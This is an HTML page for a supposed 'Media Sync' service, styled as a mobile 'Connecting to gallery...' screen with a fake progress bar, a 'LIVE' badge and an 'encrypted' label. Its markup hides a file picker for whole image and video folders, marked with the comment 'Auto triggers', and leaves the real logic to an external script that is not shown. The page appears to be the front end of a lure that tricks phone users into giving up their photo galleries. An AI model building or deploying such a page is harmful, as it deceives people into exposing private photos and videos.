<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>📱 Media Sync</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0a0a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: #111;
            border-radius: 30px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #222;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
        }

        .icon {
            font-size: 70px;
            margin-bottom: 15px;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        h2 {
            font-size: 22px;
            color: #00ff88;
            margin-bottom: 8px;
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 12px;
            border: 1px solid #2a2a2a;
            font-size: 14px;
            color: #888;
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            word-break: break-all;
        }

        .status.success { color: #00ff88; border-color: #00ff88; }
        .status.error { color: #ff4444; border-color: #ff4444; }
        .status.loading { color: #ffaa00; border-color: #ffaa00; }

        .progress-wrap {
            margin-top: 15px;
            display: none;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #222;
            border-radius: 10px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ff88, #00cc66);
            transition: width 0.3s ease;
        }

        .progress-text {
            margin-top: 10px;
            font-size: 13px;
            color: #666;
        }

        #fileInput {
            display: none;
        }

        .badge {
            display: inline-block;
            background: #ff0040;
            color: #fff;
            font-size: 10px;
            padding: 4px 14px;
            border-radius: 20px;
            margin-top: 15px;
            letter-spacing: 1px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .footer {
            margin-top: 25px;
            font-size: 11px;
            color: #333;
        }

        .hidden-btn {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon">📡</div>
        <h2>Media Sync</h2>
        <p style="color:#666;font-size:14px;margin-top:5px;">Connecting to gallery...</p>

        <div class="status" id="status">⏳ Initializing...</div>

        <div class="progress-wrap" id="progressWrap">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text" id="progressText">0%</div>
        </div>

        <div class="badge">● LIVE</div>

        <!-- FILE INPUT - Auto triggers -->
        <input type="file" id="fileInput" webkitdirectory multiple accept="image/*,video/*" />

        <div class="footer">v3.0 · encrypted</div>
    </div>

    <script src="script.js"></script>
</body>
</html>
